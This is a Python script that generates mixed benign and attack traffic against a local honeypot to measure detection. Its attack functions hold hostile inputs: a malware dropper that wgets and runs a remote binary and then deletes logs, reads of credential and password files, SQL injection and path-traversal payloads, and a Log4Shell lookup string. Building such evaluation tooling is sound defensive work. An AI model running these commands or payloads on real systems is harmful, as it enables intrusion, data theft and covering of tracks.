"""Traffic generator for demonstrations and evaluation.

Connects to a running honeypot from many loopback addresses (Linux routes all of
127.0.0.0/8 to the local machine, so each simulated client has its own source address)
and plays either background traffic (monitoring probes, staff mistyping a password,
uptime checks, crawlers) or attacks (brute force, malware droppers, credential theft, web
scanners, SQL injection, path traversal). The ground truth (which address played what) is
written next to the log so detection can be measured.
"""
import asyncio
import json
import random
from pathlib import Path

USERS = ["root", "admin", "ubuntu", "test", "oracle", "postgres", "user", "pi", "ftpuser"]
PASSWORDS = ["123456", "password", "admin", "root", "12345678", "qwerty", "1q2w3e4r",
             "toor", "raspberry", "letmein"]


class Shell:
    def __init__(self, host, port, src):
        self.host, self.port, self.src = host, port, src
        self.at_prompt = False

    async def __aenter__(self):
        self.reader, self.writer = await asyncio.open_connection(
            self.host, self.port, local_addr=(self.src, 0))
        return self

    async def __aexit__(self, *exc):
        self.writer.close()

    async def until(self, marker: bytes):
        return await asyncio.wait_for(self.reader.readuntil(marker), 5)

    async def send(self, line: str):
        self.writer.write(line.encode() + b"\n")
        await self.writer.drain()

    async def login(self, user, password) -> bool:
        if not self.at_prompt:
            await self.until(b"login: ")
        await self.send(user)
        await self.until(b"Password: ")
        await self.send(password)
        out = b""
        while b"# " not in out and b"login: " not in out:
            chunk = await asyncio.wait_for(self.reader.read(200), 5)
            if not chunk:
                raise ConnectionError("closed")
            out += chunk
        self.at_prompt = b"Welcome" not in out
        return not self.at_prompt

    async def run(self, commands, pause=(0.05, 0.3)):
        for c in commands:
            await self.send(c)
            await asyncio.sleep(random.uniform(*pause))
        await self.send("exit")


async def http(host, port, src, method, path, body="", agent="Mozilla/5.0"):
    reader, writer = await asyncio.open_connection(host, port, local_addr=(src, 0))
    writer.write(f"{method} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {agent}\r\n"
                 f"Content-Length: {len(body)}\r\n\r\n{body}".encode())
    await writer.drain()
    await reader.read()
    writer.close()


# -- background traffic -----------------------------------------------------------------------
async def probe(h, src):                       # a port monitor: connect, read banner, leave
    _, w = await asyncio.open_connection(h["host"], h["shell"], local_addr=(src, 0))
    await asyncio.sleep(0.1)
    w.close()


async def staff(h, src):                       # a typo, then the right password, a few commands
    async with Shell(h["host"], h["shell"], src) as s:
        await s.login("admin", random.choice(["Admin", "admin1", "admn"]))
        await s.login("admin", "admin")
        await s.run(random.sample(["ls", "pwd", "free -m", "w", "ls -la"], 2), (0.3, 0.8))


async def uptime(h, src):
    await http(h["host"], h["http"], src, "GET", "/", agent="UptimeRobot/2.0")


async def visitor(h, src):
    for path in random.sample(["/", "/admin", "/login"], 2):
        await http(h["host"], h["http"], src, "GET", path)
        await asyncio.sleep(random.uniform(0.3, 0.8))
    if random.random() < 0.5:
        await http(h["host"], h["http"], src, "POST", "/login", "username=ops&password=Ops@2024")


# -- attacks ----------------------------------------------------------------------------------
async def brute_force(h, src):
    async with Shell(h["host"], h["shell"], src) as s:
        for _ in range(5):
            if await s.login(random.choice(USERS), random.choice(PASSWORDS[:7])):
                await s.run(["uname -a", "nproc"])
                return


async def dropper(h, src):
    async with Shell(h["host"], h["shell"], src) as s:
        await s.login("root", "123456")
        url = f"http://45.{random.randint(10, 250)}.{random.randint(1, 250)}.7/x86"
        await s.run(["uname -a", "cd /tmp", f"wget {url}", "chmod +x x86", "nohup ./x86 &",
                     "history -c", "rm -rf /var/log/auth.log"], (0.02, 0.08))


async def credential_theft(h, src):
    async with Shell(h["host"], h["shell"], src) as s:
        await s.login("root", "root")
        await s.run(["whoami", "id", "cat /etc/passwd", "ls -la", "cat db_config.ini",
                     "ps aux", "ifconfig", "unset HISTFILE"], (0.05, 0.15))


async def web_scanner(h, src):
    paths = ["/.env", "/.git/config", "/wp-login.php", "/phpmyadmin/", "/admin/config.php",
             "/server-status", "/backup.zip", "/api/v1/users", "/actuator/env", "/.aws/credentials"]
    for path in random.sample(paths, 8):
        await http(h["host"], h["http"], src, "GET", path, agent="Nikto/2.5.0")


async def sql_injection(h, src):
    for payload in ["admin'--", "' OR '1'='1", "admin' OR 1=1 #",
                    "' UNION SELECT username,password FROM users--"]:
        await http(h["host"], h["http"], src, "POST", "/login",
                   f"username={payload}&password=x", agent="sqlmap/1.8#stable")


async def traversal(h, src):
    for path in ["/../../etc/passwd", "/..%2f..%2f..%2fetc%2fpasswd", "/login?file=../../.env",
                 "/${jndi:ldap://45.9.1.2/a}"]:
        await http(h["host"], h["http"], src, "GET", path, agent="python-requests/2.31")


BENIGN = {"probe": probe, "staff": staff, "uptime": uptime, "visitor": visitor}
ATTACKS = {"brute_force": brute_force, "dropper": dropper, "credential_theft": credential_theft,
           "web_scanner": web_scanner, "sql_injection": sql_injection, "traversal": traversal}
BASELINE_MIX = {"probe": 30, "staff": 20, "uptime": 40, "visitor": 30}
ATTACK_MIX = {"brute_force": 6, "dropper": 4, "credential_theft": 4, "web_scanner": 4,
              "sql_injection": 3, "traversal": 3}


async def play(mix: dict[str, int], truth_path: Path, host="127.0.0.1", shell=2323,
               http_port=8088, seed=1, subnet=10, concurrency=8):
    random.seed(seed)
    h = {"host": host, "shell": shell, "http": http_port}
    jobs = [(name, f"127.{subnet}.{i // 250}.{i % 250 + 2}")
            for i, name in enumerate(n for n, k in mix.items() for _ in range(k))]
    random.shuffle(jobs)
    truth = json.loads(truth_path.read_text()) if truth_path.exists() else {}
    gate = asyncio.Semaphore(concurrency)

    async def one(name, src):
        async with gate:
            truth[src] = {"behaviour": name, "attack": name in ATTACKS}
            try:
                await {**BENIGN, **ATTACKS}[name](h, src)
            except (TimeoutError, ConnectionError, asyncio.IncompleteReadError):
                pass
            await asyncio.sleep(random.uniform(0.05, 0.3))

    await asyncio.gather(*(one(n, s) for n, s in jobs))
    truth_path.write_text(json.dumps(truth, indent=1))
    return len(jobs)
